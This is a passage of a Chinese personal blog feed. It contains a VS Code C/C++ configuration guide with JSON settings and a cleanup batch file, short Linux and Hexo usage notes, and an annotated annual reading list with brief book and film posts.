$dir &amp;&amp; g++ $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc  -fexec-charset=UTF-8 &amp;&amp; $dir$fileNameWithoutExt&quot;</span><br>    <span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cd $dir &amp;&amp; gcc $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc -std=c17 -fexec-charset=UTF-8 &amp;&amp; $dir$fileNameWithoutExt&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cpp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;clear &amp;&amp; cd $dir &amp;&amp; g++ $fileName -o $fileNameWithoutExt.exe -Wall -g -O2 -static-libgcc -fexec-charset=GBK -std=c++17  &amp;&amp; $dir$fileNameWithoutExt&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 右键run code时运行的命令；未注释的仅适用于PowerShell（Win10默认），文件名中有空格也可以编译运行；注释掉的适用于cmd（win7默认），PS和bash也能用，但文件名中有空格时无法运行</span><br>  <span class="hljs-attr">&quot;code-runner.saveFileBeforeRun&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// run code前保存</span><br>  <span class="hljs-attr">&quot;code-runner.preserveFocus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 若为false，run code后光标会聚焦到终端上。如果需要频繁输入数据可设为false</span><br>  <span class="hljs-attr">&quot;code-runner.clearPreviousOutput&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 每次run code前清空属于code runner的终端消息，默认false</span><br>  <span class="hljs-attr">&quot;code-runner.ignoreSelection&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 默认为false，效果是鼠标选中一块代码后可以单独执行，但C是编译型语言，不适合这样用</span><br>  <span class="hljs-attr">&quot;C_Cpp.clang_format_sortIncludes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;files.associations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;array&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;atomic&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;*.tcc&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cctype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;clocale&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cmath&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdarg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstddef&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdio&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cstdlib&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cwchar&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;cwctype&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;deque&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;unordered_map&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;exception&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;algorithm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;memory&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;memory_resource&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;optional&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;string&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;string_view&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;system_error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tuple&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;type_traits&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;utility&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;fstream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;initializer_list&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;iosfwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;iostream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;istream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;limits&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;new&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ostream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;sstream&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;stdexcept&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;streambuf&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;typeinfo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cpp&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 格式化时调整include的顺序（按字母排序）</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">        <div class="fold-arrow">▶</div>tasks.json      </div>      <div class="fold-collapse collapse" id="collapse-9c51fa20">        <div class="fold-content">          <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.0.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;tasks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Compile&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;g++&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-o&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-g&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-Wall&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-static-libgcc&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-fexec-charset=GBK&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-std=c++11&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;process&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;build&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;presentation&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;echo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reveal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;always&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;focus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;panel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;shared&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cppbuild&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;C/C++: g++.exe 生成活动文件&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:\\programs\\mingw64\\bin\\g++.exe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;-fdiagnostics-color=always&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-g&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-o&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;problemMatcher&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$gcc&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;kind&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;build&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;isDefault&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;调试器生成的任务。&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-2f3c90d2" role="button" aria-expanded="false" aria-controls="collapse-2f3c90d2">        <div class="fold-arrow">▶</div>del.bat      </div>      <div class="fold-collapse collapse" id="collapse-2f3c90d2">        <div class="fold-content">          <figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">del</span> *.exe /q /s<br><span class="hljs-built_in">del</span> tempCodeRunnerFile.c /q /s<br><span class="hljs-built_in">del</span> a.out /q /s<br><span class="hljs-built_in">del</span> *.o /q /s<br></code></pre></td></tr></table></figure><p><strong>注意这个文件要在.vscode同级目录下。</strong></p>        </div>      </div>    </div><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理:"></a>工作原理:</h1><p><strong>使用vscode要先打开一个工作区（文件夹），编写的程序也存放在这个工作区里。</strong>使用文件夹（工作区）存放一个程序项目，原则上一个文件放置一个程序项目（单文件程序可以放多个不同的程序）。在文件夹（工作区）里放置vscode的配置文件，用于配置编程所用语言及运行程序的参数，在用vscode打开文夹时加载配置文件。因此vscode可以使用几乎所有的编程语言，就是靠不同的配置放在文件夹里加以区分。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h1><p>除了上面给出的vscodecpp配置文件，还有其他的配置办法，对应相关用途。这里不再给出。</p><ul><li>1、vscodecpp是写c++</li><li>2、vscodeC是写c<br>这两个写是单文件程序的，多个可以都放在这里边。也可以在里边建立子文件夹。</li><li>3、cpp_project   c++多文件</li><li>4、c_project     c  多文件<br>cpp_project和c_project是写多文件程序的文件来个。一个子文件夹只能放一个多文件项</li></ul><p>注：如果有以前的程序也要把程序移动到有配置文件的文件夹内才能运行。<br>常见错误：<br>1、打开程序前，没有打开带有配置文件的文件夹；<br>2、程序没有保存在当前打开的项目文件夹里；<br>3、程序编写错误导致报错，无法运行；<br>4、文件保存时误删除扩展名（ .c或是.cpp）；<br>5、在项目文件夹又建立了下一级文件夹；<br>6、把程序保存在了配置文件所在的文件夹里（.vsocde）</p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>linux使用指南</title>
    <link href="/dong.github/2024/09/19/linuxsolution/"/>
    <url>/dong.github/2024/09/19/linuxsolution/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>用来经常查阅的Linux使用指南。</strong></p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo使用指南</title>
    <link href="/dong.github/2024/09/19/hexosolution/"/>
    <url>/dong.github/2024/09/19/hexosolution/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>用来经常查阅的hexo使用指南。</strong></p><span id="more"></span><p><a href="https://blog.csdn.net/cat_bayi/article/details/128725230">https://blog.csdn.net/cat_bayi/article/details/128725230</a></p><h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作:"></a>常用操作:</h3><pre><code class="hljs">hexo cleanhexo ghexo shexo dhexo ghexo new ahexo new draft ahexo publish ahexo new page a组图  &#123;% gi total n1-n2-... %&#125;      ![](url)      ![](url)      ![](url)      ![](url)      ![](url)    &#123;% endgi %&#125;数学公式&#123;% katex %&#125;    &#123;% endkatex %&#125;折叠&#123;% fold info @title %&#125;    需要折叠的一段内容，支持 markdown    &#123;% endfold %&#125;</code></pre><h3 id="Spawn-failed错误"><a href="#Spawn-failed错误" class="headerlink" title="Spawn failed错误"></a>Spawn failed错误</h3><p>重置git的deploy文件夹<br>huahua提供的方法，删除博客文件夹中的.deploy_git文件夹，然后在终端cd这个文件夹后输入git config –global core.autocrlf false</p><p>  ssh-keygen -t rsa -C “邮箱”<br>  &#x2F;c&#x2F;Users&#x2F;用户名&#x2F;.ssh&#x2F;id_rsa文件中复制密钥</p><p>  <a href="https://blog.zhheo.com/p/128998ac.html">https://blog.zhheo.com/p/128998ac.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023学年年度书单</title>
    <link href="/dong.github/2024/09/18/book-0/"/>
    <url>/dong.github/2024/09/18/book-0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>整理出了大概的顺序，厚颜无耻地放了一堆书，有些其实我并没有完全读懂，但这些书都是曾让我印象很深刻的书，值得一看。2023学年借过的书当然不止这些，但是~，不重要。对吧。</p><span id="more"></span><p>《孤独十讲》<br>《游戏设计：筑梦之路.万物肇始》<br>《加密与解密》<br>《Python密码学编程》<br>《数学悖论与三次数学危机》&#x2F;韩雪涛<br>《纽约人 : 我们时代的城市与人 : a city…》&#x2F;泰勒<br>《资本主义十讲》&#x2F;于松<br>《软件文化》&#x2F;覃征<br>《社会工程. 卷2, 解读肢体语言》&#x2F;豪德瑙吉<br>《社会工程 : 安全体系中的人性漏洞 : the …》&#x2F;海德纳吉<br>《互联网进化史 : 从地下室革命到上帝手机 : f…》&#x2F;麦卡洛<br>《Python网络爬虫从入门到实践》<br>《保罗·克鲁格曼：经济危机》&#x2F;李硕镇<br>《计算机是怎样跑起来的》&#x2F;矢泽久雄<br>《深入理解计算机系统》<br>《Linux就该这么学》&#x2F;刘遄<br>《图说相对论》<br>《数学建模33讲 : 数学与缤纷的世界》&#x2F;朱浩楠<br>《自尊》<br>《光学》&#x2F;郭永康<br>《美国历史 : 理想与现实》&#x2F;福纳<br>《巴黎圣母院》<br>《黑铁时代》<br>《小程序, 巧应用 : 微信小程序开发实战》&#x2F;熊普江<br>《复变函数论》&#x2F;钟玉泉<br>《黄金时代》<br>《鸿蒙App开发全流程实战》&#x2F;褚洪波<br>《背对世界》&#x2F;海登赖希</p><h2 id="分类与解释"><a href="#分类与解释" class="headerlink" title="分类与解释:"></a>分类与解释:</h2><h3 id="科学与技术"><a href="#科学与技术" class="headerlink" title="科学与技术"></a>科学与技术</h3><ul><li>《游戏设计：筑梦之路.万物肇始》：好奇那些好玩的游戏怎么来的，有什么故事？这本书介绍游戏设计的基础知识和创意过程，可以满足你的好奇心。</li><li>《加密与解密》：目前仍是认为最适合用作入门的密码学书籍或者说是网安入门书籍，探讨加密和解密技术的原理与应用，看了这本完全不用上他们乱起八糟的新生研讨课了，听教授们吹牛吹一天，不如看两页书。</li><li>《Python游戏编程》：当时把代码照着抄了一遍，就是好玩，好像没啥用~</li><li>《Python密码学编程》：使用Python语言实现密码学算法和应用的指南。</li><li>《Python网络爬虫从入门到实践》：教授如何使用Python进行网络数据抓取和分析，爬虫很实用的，不信你试试。</li><li>《计算机是怎样跑起来的》：由杨频教授推荐，确实不错，看了这本无需《计算机文化》了~</li><li>《深入理解计算机系统》：深入理解计算机系统的经典教材，涵盖硬件和软件。当时C语言编程课的期末安全项目出处，共有12个lab，那个是lab3，网上还有作者再卡耐基梅隆大学的讲课视频，受益匪浅。一本值得深入的书籍，我还会再来的。</li><li>《互联网进化史 : 从地下室革命到上帝手机 》：别的书可以不看，这本书真的必读。真的。</li><li>《Linux就该这么学》：Linux系统学习入门与实践的书籍。照着来一边，This is a new world。这个如果觉得简单就直接上《鸟叔的Linux私房菜》，研究生们都在看。</li><li>《鸿蒙App开发全流程实战》：针对华为鸿蒙系统的应用开发实战教程，等工学馆把书拿过来，实训已经结束了。。。</li><li>《小程序, 巧应用 : 微信小程序开发实战》：微信小程序的开发教程，小程序只有1M，但是功能真太强大，目前这个上手不难，微信自己的开发者平台非常好。</li><li>《复变函数论》：复变函数的高等数学教材，由钟玉泉编写。选了复变函数这门选修课，你会见到一个精彩的世界。可是，像我一样懒的话。你的学分会变得不幸。</li></ul><h3 id="数学与逻辑"><a href="#数学与逻辑" class="headerlink" title="数学与逻辑"></a>数学与逻辑</h3><ul><li>《数学悖论与三次数学危机》：探讨数学史上的悖论和危机，理解数学基础的演变，极限究竟是什么东西？数学有多么严谨？当时赵辉的通识课刚好问到了第三次数学悖论，我还上去show off了一下，哈哈哈。</li><li>《数学建模33讲 : 数学与缤纷的世界》：通过实际案例展示数学建模的应用，超级好看。</li></ul><h3 id="历史与文化"><a href="#历史与文化" class="headerlink" title="历史与文化"></a>历史与文化</h3><ul><li>《纽约人 : 我们时代的城市与人》：开阔视野，泰勒笔下的纽约城市与人文景观。</li><li>《美国历史 : 理想与现实》：由张春燕老师推荐，讲述美国历史的书籍，强调理想与现实的交织，内容丰富。</li><li>《软件文化》：《计算机文化》写得像流水账，咱还是得自己找点细糠。探讨软件背后的文化、社会和经济影响。</li></ul><h3 id="心理学与社会学"><a href="#心理学与社会学" class="headerlink" title="心理学与社会学"></a>心理学与社会学</h3><ul><li>《自尊》：关于自尊心的心理学书籍，可能涉及自尊的建立、维护及其对个人行为的影响。特别好，看了就懂。</li><li>《社会工程. 卷2, 解读肢体语言》：解读肢体语言在社会互动中的作用，后来在网安法课程中被推荐过。</li><li>《社会工程 : 安全体系中的人性漏洞》：分析社会工程学的原理及其在安全领域的应用，后来在网安法课程中被推荐过。</li></ul><h3 id="经济学"><a href="#经济学" class="headerlink" title="经济学"></a>经济学</h3><ul><li>《资本主义十讲》：对资本主义制度的深入剖析和讨论，看不懂《资本论》？看这个。</li><li>《保罗·克鲁格曼：经济危机》：通过克鲁格曼的视角分析经济危机的原因和影响，很清楚。还可以配合微观经济学的视频课看，可以感受一下经济学的神奇。</li></ul><h3 id="法学"><a href="#法学" class="headerlink" title="法学"></a>法学</h3><ul><li>《法理学》：当时去旁听被推荐到的，老师是真热情，得知是旁听还给安排了讨论小组。法理学是法学的入门基础，也是在这个领域深造的高级阶梯。介绍的是法学在做判断时使用的基本原理。</li><li>《洞穴奇案》：美国13位大法官对同一庄虚构的案件的判决书，可以看到美国法律体系判例法与中国司法体系成文法的区别，看他们辩证的过程。另外还可以发现中国的法官权力是非常集中的。</li></ul><h3 id="物理学"><a href="#物理学" class="headerlink" title="物理学"></a>物理学</h3><ul><li>《图说相对论》：学了光学不会相对论？就像洗澡洗一半给你断水。时空光锥和洛伦兹变换真是太浪漫的东西，让人着迷，让人惊奇，让人难以释怀。</li></ul><h3 id="文学与艺术"><a href="#文学与艺术" class="headerlink" title="文学与艺术"></a>文学与艺术</h3><ul><li>《孤独十讲》：“孤独是成长的开始”，不是么？台湾教授蒋勋著，看了绝不后悔。</li><li>《巴黎圣母院》：维克多·雨果的经典小说，描绘法国大革命时期的社会与人性。其实我还是没看懂。</li><li>《黑铁时代》：王小波写的，从侧面了解共和国的历史，就不再会对现代中国社会的……感到惊讶了，毕竟以前是那样的。</li><li>《黄金时代》：王小波写的。好看，爱看，有点黑色幽默，但是也很痛。</li><li>《背对世界》：可以重点看第一篇和最后一篇，感受“两个人的爱，总是背对着世界。”</li></ul><h3 id="光学与自然科学"><a href="#光学与自然科学" class="headerlink" title="光学与自然科学"></a>光学与自然科学</h3><ul><li>《光学》：光学领域的专业教材或参考书，由郭永康编写。由姚欣老师推荐。当时是在询问如何用干涉的办法解释衍射，这当然是存在密切的联系的，《大学物理学》显然没说清，只给了做题方法。《光学》用积分公式推导了光学的各个现象。理解光学是理解相对论的基础，这里是环环相扣的，值得探索（因为物理是我最喜欢的学科）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>Book</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《不受掌控》(在读)</title>
    <link href="/dong.github/2024/09/18/book-1/"/>
    <url>/dong.github/2024/09/18/book-1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一方面，我们企图“掌控一切”，让世界无法再对我们说话了；另一方面，它以一种新的状态而不受掌控，我们再也无法聆听它，因为它已不再是我们能够触动(erreichbar)的了。– (德)罗萨</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>Book</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《功夫》</title>
    <link href="/dong.github/2024/09/18/movie-1/"/>
    <url>/dong.github/2024/09/18/movie-1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>“一曲肝肠断，天涯何处觅知音。”</strong></p><span id="more"></span><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=29999535&auto=1&height=66"></iframe>]]></content>
    
    
